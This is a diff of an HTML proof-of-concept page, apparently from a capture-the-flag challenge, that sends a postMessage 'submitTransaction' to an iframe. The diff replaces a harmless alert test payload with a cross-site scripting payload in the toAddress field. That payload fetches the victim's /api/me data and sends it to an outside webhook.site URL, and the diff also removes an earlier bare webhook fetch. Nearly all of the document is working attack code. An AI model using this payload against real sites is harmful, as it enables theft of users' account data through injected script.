@@ -6,16 +6,14 @@
   <body>
     <h1>OOO Poc OOO</h1>
     <script>
-
-    fetch("https://webhook.site/9acf5a8d-abd2-4389-8941-68d5198823d8/flag");
       
     setTimeout(() => {
   iframe.contentWindow.postMessage({
     type: 'submitTransaction',
     transaction: {
-      currency: '1337COIN',
+      currency: '1337COIN', 
       amount: 1,
-      toAddress: '<img src=flag onerror=alert(`0xk7edr`)>'
+      toAddress: '<img src=flag onerror="fetch(\"/api/me\").then(res => res.json()).then(data => fetch(\"https://webhook.site/1260e73e-c943-4c4a-96a4-d1523ad42027/flag=\" + encodeURIComponent(data)))">'
     }
   }, '*');
 }, 3000);
